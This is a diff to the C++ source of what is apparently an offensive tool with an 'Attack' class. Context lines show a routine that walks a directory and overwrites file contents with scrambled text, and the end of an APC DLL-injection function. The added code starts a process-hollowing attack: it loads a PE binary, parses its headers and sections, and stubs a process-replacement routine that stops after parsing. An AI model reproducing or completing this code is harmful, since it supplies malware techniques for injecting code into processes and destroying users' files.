@@ -84,7 +84,7 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 						std::cout << "Replacing line..." << std::endl;
 						std::cout << readout << std::endl << std::endl;
 						// replace each letter of word in file
-						for (int i = 0; i < readout.length() + 1; i++)
+						for (int i = 0; i < (int)readout.length() + 1; i++)
 						{
 							// shift letters up one, power up 3
 							replace += readout[i + 1 ^ 3];
@@ -265,4 +265,104 @@ BOOL Attack::APCinjection(string target, TCHAR *dll_name)
 	}
 	CloseHandle(hProcess);
 	return TRUE;
+}
+
+
+// Functions belonging to Process Hallowing attacks
+tuple<bool, char*, streampos> OpenBinary(string filename)
+{
+	auto flag = false; // assume failure
+	fstream::pos_type size{};
+	char *bin{};
+
+	ifstream ifile(filename, ios::binary | ios::in | ios::ate);
+	if (ifile.is_open())
+	{
+		size = ifile.tellg(); // set size to current filepointer location
+		bin = new char[size];
+		// Standard get filesize algorithm
+		ifile.seekg(0, ios::beg);
+		ifile.read(bin, size);
+		ifile.close();
+
+		flag = true;
+	}
+
+	return make_tuple(flag, bin, size);
+}
+
+void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
+{
+	this->size_ids = size_ids_;
+	this->size_dos_stub = size_dos_stub_;
+	this->size_inh32 = size_inh32_;
+	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
+	this->size_sections = size_sections_;
+}
+
+PE_FILE ParsePE(const char* PE)
+{
+	PE_FILE pefile{};
+	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
+	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
+	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
+	pefile.MS_DOS_STUB = vector<char>(stub_size);
+	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);
+
+	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
+	pefile.ish = vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // number of sections
+
+	auto PE_Header = PE + pefile.ids.e_lfanew;
+	std::cout << "[+] PE Header: " << PE_Header << std::endl;
+	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader;
+	std::cout << "[+] First Section Header: " << First_Section_Header << std::endl;
+
+	for (int i = 0; i < pefile.inh32.FileHeader.NumberOfSections; i++)
+	{
+		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
+	}
+
+	for (int n = 0; n < pefile.inh32.FileHeader.NumberOfSections; n++)
+	{
+		shared_ptr<char> t_char(new char[pefile.ish[n].SizeOfRawData]{}, default_delete<char[]>());
+		memcpy_s(t_char.get(), pefile.ish[n].SizeOfRawData, PE + pefile.ish[n].PointerToRawData, pefile.ish[n].SizeOfRawData);
+		pefile.Sections.push_back(t_char);
+		printf("[+] Found Section: 0x%2x\n", t_char);
+	}
+
+	size_t sections_size{};
+	for (WORD z = 0; z < pefile.inh32.FileHeader.NumberOfSections; z++)
+	{
+		sections_size += pefile.ish[z].SizeOfRawData;
+	}
+
+	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);
+
+	return pefile;
+}
+
+BOOL ProcessReplacement(TCHAR* target, string inj_exe)
+{
+	std::cout << "[ ] Opening binary to read into buffer" << std::endl;
+	tuple<bool, char*, fstream::pos_type> bin = OpenBinary(inj_exe);
+	std::cout << "[+] Opened binary" << std::endl;
+
+	if (!get<0>(bin))
+	{
+		std::cout << "[-] Error opening file" << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	char *PE_FILE = get<1>(bin); // get pointer to binary as char array
+	streamoff size_of_pe = get<2>(bin); // get the filesize from OpenBinary call
+	std::cout << "[ ] Parsing PE from buffer" << std::endl;
+	auto Parsed_PE = ParsePE(PE_FILE); // get pe_file object
+	std::cout << "[+] Got Info from PE" << std::endl;
+
+	return TRUE;
+}
+
+BOOL Attack::ProcReplace(char *arg1, string arg2)
+{
+	return ProcessReplacement((TCHAR*)arg1, arg2);
 }
